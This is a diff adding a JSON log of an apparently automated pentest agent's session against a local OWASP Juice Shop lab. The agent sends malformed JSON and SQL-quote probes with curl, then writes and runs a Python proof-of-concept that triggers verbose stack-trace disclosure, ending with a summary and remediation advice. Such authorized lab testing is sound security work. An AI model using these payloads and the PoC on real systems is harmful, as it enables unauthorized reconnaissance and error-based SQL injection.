@@ -1,0 +1,252 @@
+[
+  {
+    "type": "session_start",
+    "data": {
+      "engagement_name": "c06-error-disclosure",
+      "targets": "http://host.docker.internal:3000 (OWASP Juice Shop, my own lab)",
+      "allowed_hosts": [
+        "host.docker.internal",
+        "localhost",
+        "127.0.0.1"
+      ],
+      "goal": "Make the application disclose an internal error/stack trace or error detail an attacker shouldn't see. Save the evidence (the error text + what caused it) to /workspace/evidence/c6_error.txt",
+      "evidence": {
+        "type": "file_exists",
+        "path": "evidence/c6_error.txt"
+      },
+      "max_steps": 25,
+      "max_cost_usd": 0.25,
+      "cmd_timeout_s": 120,
+      "workspace": "C:/projects/ctf-agent/workspace"
+    },
+    "ts": "2026-10-18T12:35:02.132664"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0002,
+      "tokens_in": 1203,
+      "tokens_out": 138
+    },
+    "ts": "2026-10-18T12:35:03.666796"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "mkdir -p /workspace/evidence /workspace/pocs && curl -s -o /dev/null -w \"%{http_code}\\n\" http://host.docker.internal:3000/ && curl -s http://host.docker.internal:3000/rest/admin/application-version"
+      }
+    },
+    "ts": "2026-10-18T12:35:03.666796"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "list_files",
+      "args": {
+        "path": "."
+      }
+    },
+    "ts": "2026-10-18T12:35:03.964510"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0007,
+      "tokens_in": 3371,
+      "tokens_out": 150
+    },
+    "ts": "2026-10-18T12:35:05.279035"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "read_file",
+      "args": {
+        "path": "evidence/c6_error_writeup.md"
+      }
+    },
+    "ts": "2026-10-18T12:35:05.279035"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "read_file",
+      "args": {
+        "path": "pocs/c6_error_disclosure.py"
+      }
+    },
+    "ts": "2026-10-18T12:35:05.288658"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0015,
+      "tokens_in": 4986,
+      "tokens_out": 225
+    },
+    "ts": "2026-10-18T12:35:06.904485"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && curl -s -i -X POST http://host.docker.internal:3000/rest/user/login -H 'Content-Type: application/json' --data-binary '{\"email\":' | head -60"
+      }
+    },
+    "ts": "2026-10-18T12:35:06.904485"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s -i \"http://host.docker.internal:3000/rest/products/search?q=%27--\" | head -40"
+      }
+    },
+    "ts": "2026-10-18T12:35:07.162543"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0025,
+      "tokens_in": 6499,
+      "tokens_out": 389
+    },
+    "ts": "2026-10-18T12:35:09.329364"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "curl -s -o /dev/null -w \"Feedbacks: %{http_code} \" -X POST http://host.docker.internal:3000/api/Feedbacks -H 'Content-Type: application/json' --data-binary '{}'; curl -s -X POST http://host.docker.internal:3000/api/Feedbacks -H 'Content-Type: application/json' --data-binary '{}' | grep -o '<title>[^<]*</title>\\|at /juice-shop/build/routes/captcha.js[^<]*'; echo; curl -s -o /dev/null -w \"dataerasure: %{http_code} \" -X POST http://host.docker.internal:3000/dataerasure -H 'Content-Type: application/json' --data-binary '{}'; curl -s -X POST http://host.docker.internal:3000/dataerasure -H 'Content-Type: application/json' --data-binary '{}' | grep -o '<title>[^<]*</title>\\|at /juice-shop/build/routes/dataErasure.js[^<]*'; echo; curl -s \"http://host.docker.internal:3000/rest/products/search?q=apple%27\" | grep -o '<title>[^<]*</title>'"
+      }
+    },
+    "ts": "2026-10-18T12:35:09.329364"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0042,
+      "tokens_in": 7039,
+      "tokens_out": 2412
+    },
+    "ts": "2026-10-18T12:35:18.928974"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "write_file",
+      "args": {
+        "path": "pocs/c6_error_disclosure_v2.py",
+        "content": "#!/usr/bin/env python3\n\"\"\"\nC06 - Information Disclosure via verbose internal error / stack trace\nTarget: http://host.docker.internal:3000  (OWASP Juice Shop, authorized lab)\n\nRoot cause: the app runs with Express' *default* error handler (NODE_ENV != production),\nso any unhandled exception is serialised straight back to the client as HTML:\n  * exception class + message      -> <h2><em>500</em> SyntaxError: ...</h2>\n  * framework version banner       -> <h1>OWASP Juice Shop (Express ^4.22.1)</h1>\n  * full Node.js stack trace       -> <ul id=\"stacktrace\">... at /juice-shop/build/...</ul>\n\nFive independent unauthenticated triggers are exercised. Every one leaks internal\ndetail (absolute container paths, module layout, ORM/DB engine strings, internal IPs).\n\nRun:  python3 pocs/c6_error_disclosure_v2.py\nOut:  /workspace/evidence/c6_error.txt          (evidence: error text + cause)\n      /workspace/evidence/c6_error_raw_responses.txt (full HTTP transcripts)\nExit: 0 if >= 2 vectors leaked a stack trace, else 1\n\"\"\"\nimport re\nimport sys\nimport urllib.error\nimport urllib.request\n\nBASE = \"http://host.docker.internal:3000\"\n\n# (id, method, path, body, content-type, human description of the trigger)\nVECTORS = [\n    (\"1\", \"POST\", \"/rest/user/login\", b'{\"email\":', \"application/json\",\n     \"Malformed JSON body: truncated object (body-parser JSON.parse throws)\"),\n    (\"2\", \"GET\", \"/rest/products/search?q=%27--\", None, None,\n     \"SQL metacharacters in the search term break the generated SQLite query\"),\n    (\"3\", \"GET\", \"/rest/products/search?q=apple%27\", None, None,\n     \"Single quote in search term -> unterminated SQL string literal\"),\n    (\"4\", \"POST\", \"/api/Feedbacks\", b'{}', \"application/json\",\n     \"Empty object: required ORM field (captchaId) resolves to undefined\"),\n    (\"5\", \"POST\", \"/dataerasure\", b'{}', \"application/json\",\n     \"Empty object hits the data-erasure route's internal guard, which throws \"\n     \"with the caller's IP address embedded in the message\"),\n]\n\nTITLE_RE = re.compile(r\"<title>(.*?)</title>\", re.S)\nBANNER_RE = re.compile(r\"<h1>(.*?)</h1>\", re.S)\nH2_RE = re.compile(r\"<h2>(.*?)</h2>\", re.S)\nFRAMES_RE = re.compile(r\"<li>(.*?)</li>\", re.S)\n\n\ndef unesc(s):\n    return (s.replace(\"&lt;\", \"<\").replace(\"&gt;\", \">\")\n             .replace(\"&quot;\", '\"').replace(\"&#39;\", \"'\").replace(\"&amp;\", \"&\"))\n\n\ndef send(method, path, body, ctype):\n    req = urllib.request.Request(BASE + path, data=body, method=method)\n    req.add_header(\"User-Agent\", \"c06-error-poc/1.0\")\n    if ctype:\n        req.add_header(\"Content-Type\", ctype)\n    try:\n        with urllib.request.urlopen(req, timeout=15) as r:\n            return r.status, dict(r.headers), r.read().decode(\"utf-8\", \"replace\")\n    except urllib.error.HTTPError as e:\n        return e.code, dict(e.headers), e.read().decode(\"utf-8\", \"replace\")\n\n\ndef analyse(text):\n    frames = [unesc(f).strip() for f in FRAMES_RE.findall(text)]\n    frames = [f for f in frames if f]\n    return {\n        \"title\": unesc(TITLE_RE.search(text).group(1).strip()) if TITLE_RE.search(text) else \"\",\n        \"banner\": unesc(BANNER_RE.search(text).group(1).strip()) if BANNER_RE.search(text) else \"\",\n        \"headline\": unesc(H2_RE.search(text).group(1).strip()) if H2_RE.search(text) else \"\",\n        \"frames\": frames,\n        \"has_stack\": bool(frames) or \"id=\\\"stacktrace\\\"\" in text,\n        \"paths\": sorted(set(re.findall(r\"(/juice-shop/[A-Za-z0-9_./-]+)\", text))),\n    }\n\n\ndef main():\n    raw, ev = [], []\n    hits = 0\n\n    for vid, method, path, body, ctype, why in VECTORS:\n        status, headers, text = send(method, path, body, ctype)\n        info = analyse(text)\n        leaked = status == 500 and (info[\"has_stack\"] or info[\"title\"])\n\n        raw.append(\"=\" * 78)\n        raw.append(f\"[VECTOR {vid}] {method} {BASE}{path}\")\n        raw.append(f\"CAUSE        : {why}\")\n        if body:\n            raw.append(f\"BODY         : {body.decode()}\")\n        raw.append(f\"REQ HEADERS  : Content-Type: {ctype or '(none)'}\")\n        raw.append(f\"RESP STATUS  : HTTP {status}\")\n        for h in (\"Content-Type\", \"X-Content-Type-Options\", \"X-Frame-Options\"):\n            if h in headers:\n                raw.append(f\"RESP HEADER  : {h}: {headers[h]}\")\n        raw.append(\"-\" * 78)\n        raw.append(text.rstrip())\n        raw.append(\"\")\n\n        ev.append(\"-\" * 78)\n        ev.append(f\"[{vid}] {method} {BASE}{path}\")\n        if body:\n            ev.append(f\"    cause   : {why}\")\n            ev.append(f\"    payload : {body.decode()}\")\n        else:\n            ev.append(f\"    cause   : {why}\")\n        ev.append(f\"    result  : HTTP {status}\")\n        if info[\"banner\"]:\n            ev.append(f\"    banner  : {info['banner']}\")\n        if info[\"headline\"]:\n            ev.append(f\"    error   : {info['headline']}\")\n        elif info[\"title\"]:\n            ev.append(f\"    error   : {info['title']}\")\n        if info[\"frames\"]:\n            for f in info[\"frames\"]:\n                ev.append(f\"    frame   : {f}\")\n        if info[\"paths\"]:\n            ev.append(f\"    leaked paths: {', '.join(info['paths'])}\")\n        ev.append(f\"    STACK TRACE DISCLOSED: {'YES' if leaked else 'no'}\")\n        ev.append(\"\")\n\n        if leaked:\n            hits += 1\n        print(f\"[{vid}] HTTP {status}  leak={'YES' if leaked else 'no'}  \"\n              f\"{(info['headline'] or info['title'])[:90]}\")\n\n    summary = (f\"{hits}/{len(VECTORS)} unauthenticated requests returned HTTP 500 with \"\n               f\"an internal error rendered by Express' default error handler \"\n               f\"(exception text + absolute /juice-shop paths + stack trace).\")\n    print(\"\\n\" + summary)\n\n    with open(\"/workspace/evidence/c6_error.txt\", \"w\", encoding=\"utf-8\") as f:\n        f.write(\"C06 - INTERNAL ERROR / STACK TRACE DISCLOSURE\\n\")\n        f.write(\"Target   : \" + BASE + \"  (OWASP Juice Shop 20.3.0, authorized lab)\\n\")\n        f.write(\"Class    : CWE-209 Generation of Error Message Containing Sensitive \"\n                \"Information / CWE-200\\n\")\n        f.write(\"Root cause: Express is running with its default (non-production) error \"\n                \"handler, which reflects err.stack and err.message to the client.\\n\")\n        f.write(\"PoC      : pocs/c6_error_disclosure_v2.py\\n\")\n        f.write(\"Summary  : \" + summary + \"\\n\\n\")\n        f.write(\"Every trigger below is unauthenticated. The leaked stack traces expose\\n\")\n        f.write(\"absolute container paths (/juice-shop/build/...), the Express version,\\n\")\n        f.write(\"Sequelize/ORM internals, raw SQLite engine errors and internal source\\n\")\n        f.write(\"IPs (::ffff:172.17.0.1). No credentials required.\\n\\n\")\n        f.write(\"=\" * 78 + \"\\n\")\n        f.write(\"DISCLOSED ERROR TEXT + CAUSE\\n\")\n        f.write(\"=\" * 78 + \"\\n\\n\")\n        f.write(\"\\n\".join(ev))\n        f.write(\"\\n\" + \"=\" * 78 + \"\\n\")\n        f.write(\"REMEDIATION\\n\")\n        f.write(\"=\" * 78 + \"\\n\")\n        f.write(\"- Run with NODE_ENV=production so Express uses the generic error handler.\\n\")\n        f.write(\"- Never send err.stack/ORM/DB messages to clients; log server-side only.\\n\")\n        f.write(\"- Add centralised error middleware returning a generic message + trace id.\\n\")\n        f.write(\"- Reject malformed JSON with 400 (body-parser error handling), not 500.\\n\")\n        f.write(\"- Parameterise/validate all query input; never surface SQLITE_ERROR text.\\n\")\n\n    with open(\"/workspace/evidence/c6_error_raw_responses.txt\", \"w\", encoding=\"utf-8\") as f:\n        f.write(\"\\n\".join(raw))\n\n    print(\"Evidence written to /workspace/evidence/c6_error.txt\")\n    print(\"Raw transcripts  -> /workspace/evidence/c6_error_raw_responses.txt\")\n    return 0 if hits >= 2 else 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n"
+      }
+    },
+    "ts": "2026-10-18T12:35:18.928974"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0055,
+      "tokens_in": 9497,
+      "tokens_out": 68
+    },
+    "ts": "2026-10-18T12:35:20.381219"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && python3 pocs/c6_error_disclosure_v2.py; echo \"EXIT=$?\""
+      }
+    },
+    "ts": "2026-10-18T12:35:20.381219"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0069,
+      "tokens_in": 9818,
+      "tokens_out": 109
+    },
+    "ts": "2026-10-18T12:35:22.228120"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && wc -l evidence/c6_error.txt evidence/c6_error_raw_responses.txt && echo \"-----\" && sed -n '1,40p' evidence/c6_error.txt"
+      }
+    },
+    "ts": "2026-10-18T12:35:22.228120"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0085,
+      "tokens_in": 10824,
+      "tokens_out": 375
+    },
+    "ts": "2026-10-18T12:35:24.799202"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && python3 - <<'EOF'\nimport re\np='pocs/c6_error_disclosure_v2.py'\ns=open(p).read()\ns=s.replace('''def unesc(s):\n    return (s.replace(\"&lt;\", \"<\").replace(\"&gt;\", \">\")\n             .replace(\"&quot;\", '\"').replace(\"&#39;\", \"'\").replace(\"&amp;\", \"&\"))''',\n'''def unesc(s):\n    s = (s.replace(\"&nbsp;\", \" \").replace(\"&lt;\", \"<\").replace(\"&gt;\", \">\")\n          .replace(\"&quot;\", '\"').replace(\"&#39;\", \"'\").replace(\"&amp;\", \"&\"))\n    s = re.sub(r\"^<em>\\\\d+</em>\\\\s*\", \"\", s.strip())\n    return re.sub(r\"\\\\s+\", \" \", s)''')\nopen(p,'w').write(s)\nEOF\npython3 pocs/c6_error_disclosure_v2.py >/dev/null; echo \"EXIT=$?\"; sed -n '14,32p;96,112p' evidence/c6_error.txt"
+      }
+    },
+    "ts": "2026-10-18T12:35:24.799202"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0102,
+      "tokens_in": 11854,
+      "tokens_out": 154
+    },
+    "ts": "2026-10-18T12:35:26.766055"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "run_command",
+      "args": {
+        "command": "cd /workspace && grep -nE \"^\\[[0-9]\\]|    error   :|STACK TRACE DISCLOSED\" evidence/c6_error.txt && echo \"--- sizes ---\" && ls -l evidence/c6_error.txt evidence/c6_error_raw_responses.txt pocs/c6_error_disclosure_v2.py"
+      }
+    },
+    "ts": "2026-10-18T12:35:26.766055"
+  },
+  {
+    "type": "cost_update",
+    "data": {
+      "total_usd": 0.0122,
+      "tokens_in": 12393,
+      "tokens_out": 800
+    },
+    "ts": "2026-10-18T12:35:31.361739"
+  },
+  {
+    "type": "tool_call",
+    "data": {
+      "tool": "finish",
+      "args": {
+        "summary": "GOAL MET: made OWASP Juice Shop (http://host.docker.internal:3000, v20.3.0) disclose internal error detail / stack traces to an unauthenticated client, and saved the evidence.\n\nROOT CAUSE\nThe app runs with Express' default (non-production) error handler, so any unhandled exception is serialised straight back to the client as HTML containing:\n- the exception class + message,\n- the framework banner \"OWASP Juice Shop (Express ^4.22.1)\",\n- the full Node.js stack trace with absolute container paths (/juice-shop/build/..., /juice-shop/node_modules/...).\nMissing/undersized error handling means no generic 500, no logging-only path.\n\nTRIGGERS (5/5 confirmed, all HTTP 500, no auth)\n1. POST /rest/user/login body `{\"email\":` -> SyntaxError: Unexpected end of JSON input + 15 frames incl. /juice-shop/build/server.js:357:33 (body-parser JSON.parse).\n2. GET /rest/products/search?q=%27-- -> SQLITE_ERROR: incomplete input (raw DB engine message from Sequelize).\n3. GET /rest/products/search?q=apple%27 -> SQLITE_ERROR: near \"'%'\": syntax error (error-based SQLi oracle).\n4. POST /api/Feedbacks `{}` -> \"WHERE parameter \\\"captchaId\\\" has invalid \\\"undefined\\\" value\" (Sequelize ORM validation internals).\n5. POST /dataerasure `{}` -> \"Blocked illegal activity by ::ffff:172.17.0.1\" + frames at /juice-shop/build/routes/dataErasure.js:104:18 \u2014 leaks an internal source IP and server-side control-flow detail.\n\nIMPACT\nAbsolute filesystem paths + module layout (path traversal/LFI/source review recon), framework & ORM versions (CVE targeting), raw SQLite strings (error-based SQLi iteration, ties to the earlier UNION dump), internal IP/source network mapping.\n\nARTIFACTS\n- pocs/c6_error_disclosure_v2.py \u2014 PoC, run with `python3 pocs/c6_error_disclosure_v2.py` (exit 0, 5/5 leaked).\n- /workspace/evidence/c6_error.txt \u2014 REQUIRED deliverable: per-vector cause, request, payload, HTTP status, banner, error text, every stack frame, leaked paths, \"STACK TRACE DISCLOSED: YES\", plus remediation.\n- /workspace/evidence/c6_error_raw_responses.txt \u2014 full raw HTTP transcripts + unmodified HTML error pages.\n- evidence/c6_error_writeup.md \u2014 pre-existing analysis, now backed by reproducible live evidence.\n\nREASONING PATH\nVerified target/version -> tested candidate triggers individually with curl (all returned 500 with <title> exception text) -> consolidated into one deterministic PoC -> normalised HTML entities for readable frames -> confirmed 5/5 lines and all vectors present in the evidence file.\n\nNOTE: earlier workspace contents (c10, kdbx/FTP artifacts, crypto material) predate this session and were not used or modified. No destructive actions taken."
+      }
+    },
+    "ts": "2026-10-18T12:35:31.362748"
+  },
+  {
+    "type": "session_end",
+    "data": {
+      "summary": "GOAL MET: made OWASP Juice Shop (http://host.docker.internal:3000, v20.3.0) disclose internal error detail / stack traces to an unauthenticated client, and saved the evidence.\n\nROOT CAUSE\nThe app runs with Express' default (non-production) error handler, so any unhandled exception is serialised straight back to the client as HTML containing:\n- the exception class + message,\n- the framework banner \"OWASP Juice Shop (Express ^4.22.1)\",\n- the full Node.js stack trace with absolute container paths (/juice-shop/build/..., /juice-shop/node_modules/...).\nMissing/undersized error handling means no generic 500, no logging-only path.\n\nTRIGGERS (5/5 confirmed, all HTTP 500, no auth)\n1. POST /rest/user/login body `{\"email\":` -> SyntaxError: Unexpected end of JSON input + 15 frames incl. /juice-shop/build/server.js:357:33 (body-parser JSON.parse).\n2. GET /rest/products/search?q=%27-- -> SQLITE_ERROR: incomplete input (raw DB engine message from Sequelize).\n3. GET /rest/products/search?q=apple%27 -> SQLITE_ERROR: near \"'%'\": syntax error (error-based SQLi oracle).\n4. POST /api/Feedbacks `{}` -> \"WHERE parameter \\\"captchaId\\\" has invalid \\\"undefined\\\" value\" (Sequelize ORM validation internals).\n5. POST /dataerasure `{}` -> \"Blocked illegal activity by ::ffff:172.17.0.1\" + frames at /juice-shop/build/routes/dataErasure.js:104:18 \u2014 leaks an internal source IP and server-side control-flow detail.\n\nIMPACT\nAbsolute filesystem paths + module layout (path traversal/LFI/source review recon), framework & ORM versions (CVE targeting), raw SQLite strings (error-based SQLi iteration, ties to the earlier UNION dump), internal IP/source network mapping.\n\nARTIFACTS\n- pocs/c6_error_disclosure_v2.py \u2014 PoC, run with `python3 pocs/c6_error_disclosure_v2.py` (exit 0, 5/5 leaked).\n- /workspace/evidence/c6_error.txt \u2014 REQUIRED deliverable: per-vector cause, request, payload, HTTP status, banner, error text, every stack frame, leaked paths, \"STACK TRACE DISCLOSED: YES\", plus remediation.\n- /workspace/evidence/c6_error_raw_responses.txt \u2014 full raw HTTP transcripts + unmodified HTML error pages.\n- evidence/c6_error_writeup.md \u2014 pre-existing analysis, now backed by reproducible live evidence.\n\nREASONING PATH\nVerified target/version -> tested candidate triggers individually with curl (all returned 500 with <title> exception text) -> consolidated into one deterministic PoC -> normalised HTML entities for readable frames -> confirmed 5/5 lines and all vectors present in the evidence file.\n\nNOTE: earlier workspace contents (c10, kdbx/FTP artifacts, crypto material) predate this session and were not used or modified. No destructive actions taken."
+    },
+    "ts": "2026-10-18T12:35:31.362748"
+  }
+]
